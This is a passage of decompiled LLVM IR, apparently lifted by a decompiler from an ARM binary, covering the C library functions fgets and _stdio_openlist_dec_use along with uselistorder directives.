  uselistorder i32 %v1_16634.pre, { 0, 2, 1 }
  uselistorder i32 %v0_165ec, { 1, 0, 2 }
  uselistorder i32 %v1_165e8, { 0, 2, 1 }
  uselistorder i32 %v1_165a8, { 1, 0 }
  uselistorder i32 %v3_16560, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_1667c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_16654, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1663c, { 1, 0 }
  uselistorder label %dec_label_pc_16608, { 1, 0 }
  uselistorder label %dec_label_pc_165d8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_165c8, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1668c = load i32, i32* @r4, align 4
  store i32 %v3_1668c, i32* %stack_var_-32, align 4
  %v6_1668c = load i32, i32* @r5, align 4
  %v9_1668c = load i32, i32* @r6, align 4
  %v12_1668c = load i32, i32* @r7, align 4
  %v15_1668c = load i32, i32* @r8, align 4
  %v24_1668c = load i32, i32* @lr, align 4
  %v1_16690 = add i32 %arg3, 52
  %v2_16690 = inttoptr i32 %v1_16690 to i32*
  %v3_16690 = load i32, i32* %v2_16690, align 4
  store i32 %v3_16690, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16694 = icmp eq i32 %v3_16690, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_16694, label %dec_label_pc_166a8, label %dec_label_pc_1670c

dec_label_pc_166a8:                               ; preds = %entry
  %v0_166a8 = call i32 @__aeabi_read_tp()
  %v1_166ac = add i32 %arg3, 64
  %v2_166ac = inttoptr i32 %v1_166ac to i32*
  %v3_166ac = load i32, i32* %v2_166ac, align 4
  store i32 %v3_166ac, i32* %r3.global-to-local, align 4
  %v1_166b0 = add i32 %v0_166a8, -1168
  store i32 %v1_166b0, i32* @r8, align 4
  %v3_166b4 = icmp uge i32 %v3_166ac, %v1_166b0
  store i1 %v3_166b4, i1* %cpsr_c.global-to-local, align 1
  %v9_166b4 = icmp eq i32 %v3_166ac, %v1_166b0
  br i1 %v9_166b4, label %dec_label_pc_16700, label %dec_label_pc_166bc

dec_label_pc_166bc:                               ; preds = %dec_label_pc_166a8
  %v1_166bc = add i32 %arg3, 56
  store i32 %v1_166bc, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_166bc, i32* %r2.global-to-local, align 4
  %v0_166c8 = load i32, i32* @r6, align 4
  store i32 %v0_166c8, i32* @r4, align 4
  %v1_166cc36 = inttoptr i32 %v1_166bc to i32*
  %v2_166cc37 = load i32, i32* %v1_166cc36, align 4
  store i32 %v2_166cc37, i32* %r3.global-to-local, align 4
  %v3_166d039 = icmp uge i32 %v2_166cc37, %v0_166c8
  store i1 %v3_166d039, i1* %cpsr_c.global-to-local, align 1
  %v9_166d045 = icmp eq i32 %v2_166cc37, %v0_166c8
  br i1 %v9_166d045, label %dec_label_pc_166d8, label %dec_label_pc_166f0

dec_label_pc_166d8:                               ; preds = %dec_label_pc_166bc, %dec_label_pc_166d8.dec_label_pc_166cc_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_166e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_166e8, label %dec_label_pc_166ec, label %dec_label_pc_166d8.dec_label_pc_166cc_crit_edge

dec_label_pc_166d8.dec_label_pc_166cc_crit_edge:  ; preds = %dec_label_pc_166d8
  %v0_166cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_166d0.pre = load i32, i32* @r4, align 4
  %v1_166cc = inttoptr i32 %v0_166cc.pre to i32*
  %v2_166cc = load i32, i32* %v1_166cc, align 4
  store i32 %v2_166cc, i32* %r3.global-to-local, align 4
  %v3_166d0 = icmp uge i32 %v2_166cc, %v1_166d0.pre
  store i1 %v3_166d0, i1* %cpsr_c.global-to-local, align 1
  %v9_166d0 = icmp eq i32 %v2_166cc, %v1_166d0.pre
  br i1 %v9_166d0, label %dec_label_pc_166d8, label %dec_label_pc_166f0

dec_label_pc_166ec:                               ; preds = %dec_label_pc_166d8
  %v0_166ec = load i32, i32* @r4, align 4
  store i32 %v0_166ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166f0

dec_label_pc_166f0:                               ; preds = %dec_label_pc_166bc, %dec_label_pc_166d8.dec_label_pc_166cc_crit_edge, %dec_label_pc_166ec
  %v0_166f0 = phi i32 [ %v0_166ec, %dec_label_pc_166ec ], [ %v2_166cc37, %dec_label_pc_166bc ], [ %v2_166cc, %dec_label_pc_166d8.dec_label_pc_166cc_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_166f0 = icmp eq i32 %v0_166f0, 0
  br i1 %v2_166f0, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_166f0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_166f0, %bb
  store i32 91900, i32* @lr, align 4
  %v1_166f8 = xor i1 %v2_166f0, true
  call void @__pseudo_cond_branch(i1 %v1_166f8, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_166fc = load i32, i32* @r8, align 4
  %v1_166fc = load i32, i32* @r7, align 4
  %v2_166fc = add i32 %v1_166fc, 64
  %v3_166fc = inttoptr i32 %v2_166fc to i32*
  store i32 %v0_166fc, i32* %v3_166fc, align 4
  br label %dec_label_pc_16700

dec_label_pc_16700:                               ; preds = %dec_label_pc_166a8, %bb20
  %v0_16700 = load i32, i32* @r7, align 4
  %v1_16700 = add i32 %v0_16700, 60
  %v2_16700 = inttoptr i32 %v1_16700 to i32*
  %v3_16700 = load i32, i32* %v2_16700, align 4
  %v1_16704 = add i32 %v3_16700, 1
  store i32 %v1_16704, i32* %r3.global-to-local, align 4
  store i32 %v1_16704, i32* %v2_16700, align 4
  %v0_1670c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_16710.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16714.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1670c

dec_label_pc_1670c:                               ; preds = %entry, %dec_label_pc_16700
  %v0_16714 = phi i32 [ %arg3, %entry ], [ %v0_16714.pre, %dec_label_pc_16700 ]
  %v0_16710 = phi i32 [ %arg2, %entry ], [ %v0_16710.pre, %dec_label_pc_16700 ]
  %v0_1670c = phi i32 [ %arg1, %entry ], [ %v0_1670c.pre, %dec_label_pc_16700 ]
  store i32 %v0_16710, i32* %r1.global-to-local, align 4
  store i32 %v0_16714, i32* %r2.global-to-local, align 4
  %v3_16718 = inttoptr i32 %v0_1670c to i8*
  %v4_16718 = call i32 @__GI_fgets_unlocked(i8* %v3_16718, i32 %v0_16710, i32 %v0_16714)
  %v0_1671c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1671c = icmp eq i32 %v0_1671c, 0
  store i32 %v4_16718, i32* %r8.global-to-local, align 4
  br i1 %v2_1671c, label %dec_label_pc_16728, label %dec_label_pc_1679c

dec_label_pc_16728:                               ; preds = %dec_label_pc_1670c
  %v0_16728 = load i32, i32* @r7, align 4
  %v1_16728 = add i32 %v0_16728, 60
  %v2_16728 = inttoptr i32 %v1_16728 to i32*
  %v3_16728 = load i32, i32* %v2_16728, align 4
  %v1_1672c = add i32 %v3_16728, -1
  store i32 %v1_1672c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16730 = icmp eq i32 %v1_1672c, 0
  store i32 %v1_1672c, i32* %v2_16728, align 4
  br i1 %v2_16730, label %dec_label_pc_1673c, label %dec_label_pc_1679c

dec_label_pc_1673c:                               ; preds = %dec_label_pc_16728
  %v0_1673c = load i32, i32* %r3.global-to-local, align 4
  %v1_1673c = load i32, i32* @r7, align 4
  %v2_1673c = add i32 %v1_1673c, 64
  %v3_1673c = inttoptr i32 %v2_1673c to i32*
  store i32 %v0_1673c, i32* %v3_1673c, align 4
  %v0_16740 = load i32, i32* @r7, align 4
  %v1_16740 = add i32 %v0_16740, 56
  store i32 %v1_16740, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16744

dec_label_pc_16744:                               ; preds = %dec_label_pc_16774.dec_label_pc_16744_crit_edge, %dec_label_pc_1673c
  %v0_1674c = phi i32 [ %v0_1674c.pre, %dec_label_pc_16774.dec_label_pc_16744_crit_edge ], [ %v1_16740, %dec_label_pc_1673c ]
  %v0_16744 = phi i32 [ %v0_16744.pre, %dec_label_pc_16774.dec_label_pc_16744_crit_edge ], [ %v0_16740, %dec_label_pc_1673c ]
  %v1_16744 = add i32 %v0_16744, 56
  %v2_16744 = inttoptr i32 %v1_16744 to i32*
  %v3_16744 = load i32, i32* %v2_16744, align 4
  store i32 %v3_16744, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1674c, i32* %r2.global-to-local, align 4
  %v1_1675024 = inttoptr i32 %v0_1674c to i32*
  %v2_1675025 = load i32, i32* %v1_1675024, align 4
  store i32 %v2_1675025, i32* %r3.global-to-local, align 4
  %v3_1675427 = icmp uge i32 %v2_1675025, %v3_16744
  store i1 %v3_1675427, i1* %cpsr_c.global-to-local, align 1
  %v9_1675433 = icmp eq i32 %v2_1675025, %v3_16744
  br i1 %v9_1675433, label %dec_label_pc_1675c, label %dec_label_pc_16774

dec_label_pc_1675c:                               ; preds = %dec_label_pc_16744, %dec_label_pc_1675c.dec_label_pc_16750_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1676c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1676c, label %dec_label_pc_16770, label %dec_label_pc_1675c.dec_label_pc_16750_crit_edge

dec_label_pc_1675c.dec_label_pc_16750_crit_edge:  ; preds = %dec_label_pc_1675c
  %v0_16750.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16754.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16750 = inttoptr i32 %v0_16750.pre to i32*
  %v2_16750 = load i32, i32* %v1_16750, align 4
  store i32 %v2_16750, i32* %r3.global-to-local, align 4
  %v3_16754 = icmp uge i32 %v2_16750, %v1_16754.pre
  store i1 %v3_16754, i1* %cpsr_c.global-to-local, align 1
  %v9_16754 = icmp eq i32 %v2_16750, %v1_16754.pre
  br i1 %v9_16754, label %dec_label_pc_1675c, label %dec_label_pc_16774

dec_label_pc_16770:                               ; preds = %dec_label_pc_1675c
  %v0_16770 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16770, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16774

dec_label_pc_16774:                               ; preds = %dec_label_pc_16744, %dec_label_pc_1675c.dec_label_pc_16750_crit_edge, %dec_label_pc_16770
  %v0_1677c = phi i32 [ %v0_16770, %dec_label_pc_16770 ], [ %v2_1675025, %dec_label_pc_16744 ], [ %v2_16750, %dec_label_pc_1675c.dec_label_pc_16750_crit_edge ]
  %v1_16774 = phi i32 [ %v0_16770, %dec_label_pc_16770 ], [ %v3_16744, %dec_label_pc_16744 ], [ %v1_16754.pre, %dec_label_pc_1675c.dec_label_pc_16750_crit_edge ]
  %v3_16774 = icmp uge i32 %v0_1677c, %v1_16774
  store i1 %v3_16774, i1* %cpsr_c.global-to-local, align 1
  %v9_16774 = icmp eq i32 %v0_1677c, %v1_16774
  br i1 %v9_16774, label %dec_label_pc_1677c, label %dec_label_pc_16774.dec_label_pc_16744_crit_edge

dec_label_pc_16774.dec_label_pc_16744_crit_edge:  ; preds = %dec_label_pc_16774
  %v0_16744.pre = load i32, i32* @r7, align 4
  %v0_1674c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16744

dec_label_pc_1677c:                               ; preds = %dec_label_pc_16774
  %v2_1677c = icmp ne i32 %v1_16774, 0
  store i1 %v2_1677c, i1* %cpsr_c.global-to-local, align 1
  %v7_16780 = icmp slt i32 %v1_16774, 2
  br i1 %v7_16780, label %dec_label_pc_1679c, label %dec_label_pc_16784

dec_label_pc_16784:                               ; preds = %dec_label_pc_1677c
  %v0_16788 = load i32, i32* %r1.global-to-local, align 4
  %v1_16788 = add i32 %v0_16788, 129
  store i32 %v1_16788, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1679c

dec_label_pc_1679c:                               ; preds = %dec_label_pc_16728, %dec_label_pc_1670c, %dec_label_pc_16784, %dec_label_pc_1677c
  %v0_1679c = load i32, i32* %r8.global-to-local, align 4
  %v2_167a0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_167a0, i32* %r4.global-to-local, align 4
  store i32 %v6_1668c, i32* @r5, align 4
  store i32 %v9_1668c, i32* @r6, align 4
  store i32 %v12_1668c, i32* @r7, align 4
  store i32 %v15_1668c, i32* @r8, align 4
  store i32 %v24_1668c, i32* @lr, align 4
  ret i32 %v0_1679c

; uselistorder directives
  uselistorder i32 %v0_16770, { 1, 0, 2 }
  uselistorder i32 %v1_16754.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16710, { 1, 0 }
  uselistorder i32 %v0_16714, { 1, 0 }
  uselistorder i32 %v1_166d0.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_1679c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16774, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1675c, { 1, 0 }
  uselistorder label %dec_label_pc_1670c, { 1, 0 }
  uselistorder label %dec_label_pc_16700, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_166f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_166d8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_167a8 = load i32, i32* @r4, align 4
  store i32 %v3_167a8, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r5.global-to-local, align 4
  %v4_167b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 160) to i32*), align 4
  store i32 %v4_167b8, i32* %r7.global-to-local, align 4
  %v0_167bc = call i32 @__aeabi_read_tp()
  store i32 %v0_167bc, i32* %r0.global-to-local, align 4
  %v1_167c0 = add i32 %v4_167b8, 8
  %v2_167c0 = inttoptr i32 %v1_167c0 to i32*
  %v3_167c0 = load i32, i32* %v2_167c0, align 4
  store i32 %v3_167c0, i32* %r3.global-to-local, align 4
  %v1_167c4 = add i32 %v0_167bc, -1168
  store i32 %v1_167c4, i32* %r6.global-to-local, align 4
  %v3_167c8 = icmp uge i32 %v3_167c0, %v1_167c4
  store i1 %v3_167c8, i1* %cpsr_c.global-to-local, align 1
  %v9_167c8 = icmp eq i32 %v3_167c0, %v1_167c4
  br i1 %v9_167c8, label %dec_label_pc_16814, label %dec_label_pc_167d4

dec_label_pc_167d4:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_167b8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_167e093 = inttoptr i32 %v4_167b8 to i32*
  %v2_167e094 = load i32, i32* %v1_167e093, align 4
  store i32 %v2_167e094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_167e496 = icmp eq i32 %v2_167e094, 0
  br i1 %v9_167e496, label %dec_label_pc_167ec, label %dec_label_pc_16804

dec_label_pc_167ec:                               ; preds = %dec_label_pc_167d4, %dec_label_pc_167ec.dec_label_pc_167e0_crit_edge
  %v0_167ec97 = phi i32 [ %v1_167e4.pre, %dec_label_pc_167ec.dec_label_pc_167e0_crit_edge ], [ 0, %dec_label_pc_167d4 ]
  store i32 %v0_167ec97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_167fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_167fc, label %dec_label_pc_16800, label %dec_label_pc_167ec.dec_label_pc_167e0_crit_edge

dec_label_pc_167ec.dec_label_pc_167e0_crit_edge:  ; preds = %dec_label_pc_167ec
  %v0_167e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_167e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_167e0 = inttoptr i32 %v0_167e0.pre to i32*
  %v2_167e0 = load i32, i32* %v1_167e0, align 4
  store i32 %v2_167e0, i32* %r3.global-to-local, align 4
  %v3_167e4 = icmp uge i32 %v2_167e0, %v1_167e4.pre
  store i1 %v3_167e4, i1* %cpsr_c.global-to-local, align 1
  %v9_167e4 = icmp eq i32 %v2_167e0, %v1_167e4.pre
  br i1 %v9_167e4, label %dec_label_pc_167ec, label %dec_label_pc_16804

dec_label_pc_16800:                               ; preds = %dec_label_pc_167ec
  %v0_16800 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16800, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16804

dec_label_pc_16804:                               ; preds = %dec_label_pc_167d4, %dec_label_pc_167ec.dec_label_pc_167e0_crit_edge, %dec_label_pc_16800
  %v0_16804 = phi i32 [ %v0_16800, %dec_label_pc_16800 ], [ %v2_167e094, %dec_label_pc_167d4 ], [ %v2_167e0, %dec_label_pc_167ec.dec_label_pc_167e0_crit_edge ]
  %v1_16804 = phi i32 [ %v0_16800, %dec_label_pc_16800 ], [ 0, %dec_label_pc_167d4 ], [ %v1_167e4.pre, %dec_label_pc_167ec.dec_label_pc_167e0_crit_edge ]
  %v3_16804 = icmp uge i32 %v0_16804, %v1_16804
  store i1 %v3_16804, i1* %cpsr_c.global-to-local, align 1
  %v9_16804 = icmp eq i32 %v0_16804, %v1_16804
  br i1 %v9_16804, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16804
  %v1_16808 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16808, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16804, %bb
  %v1_1680c = xor i1 %v9_16804, true
  call void @__pseudo_cond_branch(i1 %v1_1680c, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_16810 = load i32, i32* %r6.global-to-local, align 4
  %v1_16810 = load i32, i32* %r7.global-to-local, align 4
  %v2_16810 = add i32 %v1_16810, 8
  %v3_16810 = inttoptr i32 %v2_16810 to i32*
  store i32 %v0_16810, i32* %v3_16810, align 4
  br label %dec_label_pc_16814

dec_label_pc_16814:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16818 = load i32, i32* %r5.global-to-local, align 4
  %v2_16818 = add i32 %v0_16818, 160
  %v3_16818 = inttoptr i32 %v2_16818 to i32*
  %v4_16818 = load i32, i32* %v3_16818, align 4
  store i32 %v4_16818, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16820 = add i32 %v0_16818, 12
  %v3_16820 = inttoptr i32 %v2_16820 to i32*
  %v4_16820 = load i32, i32* %v3_16820, align 4
  store i32 %v4_16820, i32* %r3.global-to-local, align 4
  %v1_16824 = inttoptr i32 %v4_16820 to i32*
  %v2_16824 = load i32, i32* %v1_16824, align 4
  store i32 %v2_16824, i32* %r1.global-to-local, align 4
  %v1_16828 = add i32 %v4_16818, 4
  %v2_16828 = inttoptr i32 %v1_16828 to i32*
  %v3_16828 = load i32, i32* %v2_16828, align 4
  %v2_1682c = icmp ne i32 %v2_16824, 0
  store i1 %v2_1682c, i1* %cpsr_c.global-to-local, align 1
  %v7_1682c = icmp eq i32 %v2_16824, 1
  %v1_16830 = add i32 %v3_16828, 1
  store i32 %v1_16830, i32* %r3.global-to-local, align 4
  store i32 %v1_16830, i32* %v2_16828, align 4
  br i1 %v7_1682c, label %dec_label_pc_1683c, label %dec_label_pc_169a0

dec_label_pc_1683c:                               ; preds = %dec_label_pc_16814
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16840 = load i32, i32* %r5.global-to-local, align 4
  %v2_16840 = add i32 %v0_16840, 80
  %v3_16840 = inttoptr i32 %v2_16840 to i32*
  %v4_16840 = load i32, i32* %v3_16840, align 4
  store i32 %v4_16840, i32* %r3.global-to-local, align 4
  %v1_16844 = inttoptr i32 %v4_16840 to i32*
  %v2_16844 = load i32, i32* %v1_16844, align 4
  store i32 %v2_16844, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_16844, 1
  br i1 %tmp46, label %dec_label_pc_169a0, label %dec_label_pc_16850

dec_label_pc_16850:                               ; preds = %dec_label_pc_1683c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16854 = add i32 %v0_16840, 152
  %v3_16854 = inttoptr i32 %v2_16854 to i32*
  %v4_16854 = load i32, i32* %v3_16854, align 4
  store i32 %v4_16854, i32* %r7.global-to-local, align 4
  %v1_16858 = add i32 %v4_16854, 8
  %v2_16858 = inttoptr i32 %v1_16858 to i32*
  %v3_16858 = load i32, i32* %v2_16858, align 4
  store i32 %v3_16858, i32* %r3.global-to-local, align 4
  %v1_1685c = load i32, i32* %r6.global-to-local, align 4
  %v3_1685c = icmp uge i32 %v3_16858, %v1_1685c
  store i1 %v3_1685c, i1* %cpsr_c.global-to-local, align 1
  %v9_1685c = icmp eq i32 %v3_16858, %v1_1685c
  br i1 %v9_1685c, label %dec_label_pc_168a0, label %dec_label_pc_16864

dec_label_pc_16864:                               ; preds = %dec_label_pc_16850
  store i32 %v4_16854, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1686c86 = inttoptr i32 %v4_16854 to i32*
  %v2_1686c87 = load i32, i32* %v1_1686c86, align 4
  store i32 %v2_1686c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1687089 = icmp eq i32 %v2_1686c87, 0
  br i1 %v9_1687089, label %dec_label_pc_16878, label %dec_label_pc_16890

dec_label_pc_16878:                               ; preds = %dec_label_pc_16864, %dec_label_pc_16878.dec_label_pc_1686c_crit_edge
  %v0_1687890 = phi i32 [ %v1_16870.pre, %dec_label_pc_16878.dec_label_pc_1686c_crit_edge ], [ 0, %dec_label_pc_16864 ]
  store i32 %v0_1687890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16888 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16888, label %dec_label_pc_1688c, label %dec_label_pc_16878.dec_label_pc_1686c_crit_edge

dec_label_pc_16878.dec_label_pc_1686c_crit_edge:  ; preds = %dec_label_pc_16878
  %v0_1686c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16870.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1686c = inttoptr i32 %v0_1686c.pre to i32*
  %v2_1686c = load i32, i32* %v1_1686c, align 4
  store i32 %v2_1686c, i32* %r3.global-to-local, align 4
  %v3_16870 = icmp uge i32 %v2_1686c, %v1_16870.pre
  store i1 %v3_16870, i1* %cpsr_c.global-to-local, align 1
  %v9_16870 = icmp eq i32 %v2_1686c, %v1_16870.pre
  br i1 %v9_16870, label %dec_label_pc_16878, label %dec_label_pc_16890

dec_label_pc_1688c:                               ; preds = %dec_label_pc_16878
  %v0_1688c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1688c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16890

dec_label_pc_16890:                               ; preds = %dec_label_pc_16864, %dec_label_pc_16878.dec_label_pc_1686c_crit_edge, %dec_label_pc_1688c
  %v0_16890 = phi i32 [ %v0_1688c, %dec_label_pc_1688c ], [ %v2_1686c87, %dec_label_pc_16864 ], [ %v2_1686c, %dec_label_pc_16878.dec_label_pc_1686c_crit_edge ]
  %v1_16890 = phi i32 [ %v0_1688c, %dec_label_pc_1688c ], [ 0, %dec_label_pc_16864 ], [ %v1_16870.pre, %dec_label_pc_16878.dec_label_pc_1686c_crit_edge ]
  %v3_16890 = icmp uge i32 %v0_16890, %v1_16890
  store i1 %v3_16890, i1* %cpsr_c.global-to-local, align 1
  %v9_16890 = icmp eq i32 %v0_16890, %v1_16890
  br i1 %v9_16890, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_16890
  %v1_16894 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16894, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16890, %bb47
  %v1_16898 = xor i1 %v9_16890, true
  call void @__pseudo_cond_branch(i1 %v1_16898, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_1689c = load i32, i32* %r6.global-to-local, align 4
  %v1_1689c = load i32, i32* %r7.global-to-local, align 4
  %v2_1689c = add i32 %v1_1689c, 8
  %v3_1689c = inttoptr i32 %v2_1689c to i32*
  store i32 %v0_1689c, i32* %v3_1689c, align 4
  %v0_168a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_168a0

dec_label_pc_168a0:                               ; preds = %dec_label_pc_16850, %bb48
  %v0_168a8 = phi i32 [ %v0_16840, %dec_label_pc_16850 ], [ %v0_168a8.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_168a8 = add i32 %v0_168a8, 152
  %v3_168a8 = inttoptr i32 %v2_168a8 to i32*
  %v4_168a8 = load i32, i32* %v3_168a8, align 4
  store i32 %v4_168a8, i32* %r0.global-to-local, align 4
  %v2_168ac = add i32 %v0_168a8, 76
  %v3_168ac = inttoptr i32 %v2_168ac to i32*
  %v4_168ac = load i32, i32* %v3_168ac, align 4
  store i32 %v4_168ac, i32* %r2.global-to-local, align 4
  %v1_168b0 = add i32 %v4_168a8, 4
  %v2_168b0 = inttoptr i32 %v1_168b0 to i32*
  %v3_168b0 = load i32, i32* %v2_168b0, align 4
  store i32 %v3_168b0, i32* %r3.global-to-local, align 4
  %v1_168b4 = inttoptr i32 %v4_168ac to i32*
  %v2_168b4 = load i32, i32* %v1_168b4, align 4
  store i32 %v2_168b4, i32* %r2.global-to-local, align 4
  %v1_168b8 = add i32 %v3_168b0, 1
  store i32 %v1_168b8, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_168b8, i32* %v2_168b0, align 4
  %v0_16908.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1690811 = icmp eq i32 %v0_16908.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1690811, label %dec_label_pc_16914, label %dec_label_pc_168cc

dec_label_pc_168cc:                               ; preds = %dec_label_pc_168a0, %dec_label_pc_16904
  %v0_168f02 = phi i32 [ %v0_16904, %dec_label_pc_16904 ], [ %v0_16908.pr, %dec_label_pc_168a0 ]
  %v1_168cc = inttoptr i32 %v0_168f02 to i16*
  %v2_168cc = load i16, i16* %v1_168cc, align 2
  %v3_168cc = zext i16 %v2_168cc to i32
  store i32 %v3_168cc, i32* %r3.global-to-local, align 4
  %v2_168d0 = and i32 %v3_168cc, 32816
  store i32 %v2_168d0, i32* %r1.global-to-local, align 4
  %v2_168d4 = icmp ugt i32 %v2_168d0, 47
  store i1 %v2_168d4, i1* %cpsr_c.global-to-local, align 1
